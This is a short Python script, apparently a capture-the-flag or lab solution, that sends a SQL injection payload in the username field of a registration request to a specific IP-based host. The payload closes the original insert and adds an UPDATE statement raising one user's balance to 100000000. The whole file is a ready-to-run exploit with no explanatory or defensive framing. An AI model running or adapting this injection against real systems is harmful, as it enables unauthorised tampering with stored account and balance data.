import requests
import random

url = "http://135.181.47.96.nip.io/register" 

dummy_user_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
user_id = 'q123'
new_balance = 100000000

malicious_username = f"{dummy_user_name}', 0); UPDATE user_balances SET balance = {new_balance} WHERE user_id = '{user_id}'; --"

password = "dummy"  
response = requests.post(url, data={"username": malicious_username, "password": password})

print(response, response.text)